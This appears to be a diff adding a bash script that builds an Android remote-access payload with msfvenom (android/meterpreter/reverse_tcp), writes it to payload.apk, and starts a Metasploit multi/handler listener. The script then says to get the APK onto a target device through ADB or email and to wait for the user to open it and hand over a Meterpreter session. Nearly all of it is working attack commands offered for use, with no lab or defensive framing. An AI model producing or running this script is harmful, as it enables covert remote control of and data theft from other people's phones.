@@ -1,0 +1,59 @@
+#!/bin/bash
+
+# Script to create a payload for Android using Meterpreter and msfvenom
+
+# Step 1: Environment Setup
+# Make sure you have Metasploit Framework installed on your system.
+# This script assumes you are using Kali Linux or a compatible system.
+
+# Update repositories and install Metasploit
+sudo apt update
+sudo apt install -y metasploit-framework
+
+# Step 2: Generate the Payload
+# Run msfvenom to create the Android payload with Meterpreter.
+
+# Define your IP and port
+LHOST=<your_ip>  # Replace <your_ip> with your IP address
+LPORT=<port>  # Replace <port> with the desired port (e.g., 4444)
+
+# Generate the APK payload
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o payload.apk
+
+# Verify that the payload.apk file has been created
+ls -l payload.apk
+
+# Step 3: Set up the Listener in Metasploit
+# Start Metasploit to configure the handler.
+
+# Open Metasploit
+msfconsole <<EOF
+# Configure the exploit
+use exploit/multi/handler
+
+# Configure the payload
+set payload android/meterpreter/reverse_tcp
+
+# Set the LHOST and LPORT options
+set LHOST $LHOST
+set LPORT $LPORT
+
+# Start the listener
+exploit
+EOF
+
+# Step 4: Install the Payload on the Android Device
+# Transfer the payload.apk file to the Android device using ADB, email, etc.
+# Make sure the device has installations from unknown sources enabled.
+
+# You can add the ADB command here if the device is connected:
+# adb install payload.apk
+
+# Step 5: Capture the Meterpreter Session
+# Once the user opens the APK on the Android device, you should see an active Meterpreter session.
+
+# Interact with the session using the session ID shown in Metasploit.
+# For example, if the session ID is 1:
+# sessions -i 1
+
+# End of Script
